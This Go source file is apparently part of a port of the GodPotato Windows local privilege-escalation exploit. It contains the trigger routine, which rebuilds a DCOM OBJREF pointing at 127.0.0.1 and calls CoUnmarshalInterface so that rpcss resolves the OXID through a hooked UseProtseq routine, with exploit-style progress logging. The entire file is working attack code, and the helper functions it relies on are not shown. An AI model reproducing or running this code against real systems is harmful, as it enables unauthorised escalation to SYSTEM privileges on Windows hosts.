package main

// GodPotatoUnmarshalTrigger is a port of the C++ GodPotatoUnmarshalTrigger:
// obtain a real local OXID, rebuild a STANDARD OBJREF whose DUALSTRINGARRAY
// points at 127.0.0.1, and call CoUnmarshalInterface so rpcss resolves the OXID
// through our hooked UseProtseq routine.
type GodPotatoUnmarshalTrigger struct {
	ctx *GodPotatoContext
}

func NewGodPotatoUnmarshalTrigger(ctx *GodPotatoContext) *GodPotatoUnmarshalTrigger {
	return &GodPotatoUnmarshalTrigger{ctx: ctx}
}

func (t *GodPotatoUnmarshalTrigger) Trigger() int {
	data, err := createLocalObjRef()
	if err != nil {
		logInfo("[!] createLocalObjRef failed: %v", err)
		return -1
	}

	o, err := parseObjRef(data)
	if err != nil || o.StandardObjRef == nil {
		logInfo("[!] parseObjRef failed: %v", err)
		return -1
	}
	std := o.StandardObjRef

	logInfo("[*] DCOM obj GUID: %x", o.Guid)
	logInfo("[*] DCOM obj IPID: %x", std.IPID)
	logInfo("[*] DCOM obj OXID: 0x%x", std.OXID)
	logInfo("[*] DCOM obj OID: 0x%x", std.OID)
	logInfo("[*] DCOM obj Flags: 0x%x", std.Flags)
	logInfo("[*] DCOM obj PublicRefs: 0x%x", std.PublicRefs)

	newObj := buildObjRef(iidIUnknown, std.OXID, std.OID, std.IPID,
		epmProtocolTCP, "127.0.0.1")
	logInfo("[*] Marshal Object bytes len: %d", len(newObj))

	logInfo("[*] UnMarshal Object")
	ppv, err := coUnmarshalInterface(newObj)
	if err != nil {
		logInfo("[!] %v", err)
		return -1
	}
	comRelease(ppv)
	return 0
}
